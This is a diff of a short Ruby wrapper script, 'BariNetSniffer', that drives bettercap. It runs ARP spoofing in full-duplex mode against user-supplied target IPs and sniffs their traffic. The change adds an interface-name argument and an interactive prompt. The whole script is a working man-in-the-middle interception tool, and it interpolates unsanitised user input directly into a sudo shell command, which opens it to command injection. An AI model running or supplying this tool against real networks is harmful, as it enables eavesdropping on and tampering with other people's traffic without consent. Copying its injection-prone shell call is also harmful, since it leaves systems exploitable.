@@ -1,18 +1,22 @@
 #!/usr/bin/ruby
 
-def script(targets)
+def script(interface_name, targets)
 	script = "net.probe on;"
 	script += "set arp.spoof.fullduplex true;"
 	script += "set arp.spoof.targets #{targets};"
 	script += "arp.spoof on;"
 	script += "net.sniff on"
-	system "bettercap -silent -iface wlan0 -eval \"#{script}\""
+	system "sudo bettercap -silent -iface #{interface_name} -eval \"#{script}\""
 end
 
 def interactive
+	print "Enter interface name: "
+	interf_name = gets.chomp
+	
 	print "Enter targets IPs (separated with commas): "
 	targets = gets.chomp
-	script targets
+	
+	script interf_name, targets
 end
 
 system("sudo print")
@@ -23,7 +27,8 @@ if not system("bettercap -version > /dev/null") then
 end
 
 if ["-h", "--help", "-help", "help"].include? ARGV[0]  then
-	puts "netsniffer <targets (separated by commas)>"
+	puts "netsniffer (for interactive shell)\n" +
+		 "netsniffer <interface-name> <targets (separated by commas)>"
 else
 	puts "---------------------\n" + 
 		" BariNetSniffer v1.0\n" +
@@ -34,8 +39,8 @@ else
 		"--------------------\n" +
 		"\n"
 		
-	if ARGV[0] != nil then
-		script ARGV[0]
+	if ARGV[0] != nil and ARGV[1] != nil then
+		script ARGV[0], ARGV[1]
 	else
 		interactive
 	end
